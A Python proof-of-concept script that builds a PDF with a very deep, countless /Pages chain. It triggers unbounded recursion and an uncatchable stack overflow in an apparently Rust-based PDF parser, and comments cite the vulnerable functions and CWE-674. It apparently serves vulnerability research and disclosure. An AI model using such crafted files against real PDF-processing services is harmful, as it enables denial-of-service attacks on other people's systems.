#!/usr/bin/env python3
# Generate a PDF with a deep LINEAR /Pages chain (each /Type/Pages, /Kids[next], NO /Count).
# Document::load_metadata -> extract_page_count -> get_pages_tree_count recurses per Kid with
# only a cycle guard (no depth bound) -> native stack overflow (uncatchable SIGABRT).
# CONFIRMED 2026-07-18: N=200000 overflows the default 8MB stack under plain release
# (overflow-checks off). Both Track B models flagged this (reader.rs:771 / document.rs:662, CWE-674).
import sys
N = int(sys.argv[2]) if len(sys.argv) > 2 else 200000
objs = [b"<</Type/Catalog/Pages 2 0 R>>"]
for i in range(2, N + 2):
    objs.append(b"<</Type/Pages/Kids[]>>" if i == N + 1 else b"<</Type/Pages/Kids[%d 0 R]>>" % (i + 1))
out = bytearray(b"%PDF-1.5\n"); offs = [0]
for idx, b in enumerate(objs, 1):
    offs.append(len(out)); out += b"%d 0 obj %s endobj\n" % (idx, b)
xo = len(out); n = len(objs) + 1
out += b"xref\n0 %d\n0000000000 65535 f \n" % n
for o in offs[1:]: out += b"%010d 00000 n \n" % o
out += b"trailer <</Root 1 0 R/Size %d>>\nstartxref\n%d\n%%%%EOF" % (n, xo)
open(sys.argv[1], "wb").write(out)
print("wrote %d pages-nodes, %d bytes" % (N, len(out)))
